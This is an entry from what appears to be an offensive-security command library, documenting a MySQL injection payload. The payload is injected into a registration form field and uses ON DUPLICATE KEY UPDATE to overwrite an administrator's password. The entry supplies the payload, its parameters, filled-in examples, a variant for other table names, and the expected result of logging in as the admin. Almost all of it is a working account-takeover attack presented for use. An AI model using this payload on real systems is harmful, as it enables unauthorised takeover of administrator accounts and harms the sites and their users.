---
id: 21476395-2584-46c7-8eae-4c9a4421ad6e
name: mysql-inject-admin-password-update
type: command
executor: sql
data: >-
  INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com",
  "$_PASSWORD_HASH"), ("$_ADMIN_EMAIL", "$_PASSWORD_HASH") ON DUPLICATE KEY
  UPDATE password="$_PASSWORD_HASH" -- 
output: null
created_at: '2023-04-06T03:56:36.647809+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - MySQL
tags:
  - SQL Injection
  - Password Update
verified: true
validated: true
---

# mysql-inject-admin-password-update

## Command

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "$_PASSWORD_HASH"), ("$_ADMIN_EMAIL", "$_PASSWORD_HASH") ON DUPLICATE KEY UPDATE password="$_PASSWORD_HASH" --
```

## Description

This command injects an SQL payload into a vulnerable web form to insert a dummy user and update an existing admin user's password using MySQL's ON DUPLICATE KEY UPDATE, enabling account takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_PASSWORD_HASH` | Bcrypt (or app-specific) hash of the new password (e.g., hash of 'qwerty') | Yes |
| `$_ADMIN_EMAIL` | Email of the target admin account (e.g., 'admin@example.com') | Yes |
| `--` | Comment to terminate the injected query | Yes |

## Examples

### Basic Usage

```sql
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --
```

Inject into the email field of a registration form.

### Advanced Usage

Adjust table/column names if known via prior enumeration:

```sql
INSERT INTO accounts (username, pass_hash) VALUES ('dummy', '$_PASSWORD_HASH'), ('admin', '$_PASSWORD_HASH') ON DUPLICATE KEY UPDATE pass_hash='$_PASSWORD_HASH' --
```

## Expected Output

No visible error if successful; the dummy insert triggers update silently. Subsequent login with admin email and plaintext password (e.g., 'qwerty') succeeds.

## Related

- [[procedures/SQL-Injection-Admin-Password-Change-via-ON-DUPLICATE-KEY-UPDATE]]
- [[commands/mysql-test-sql-injection]]
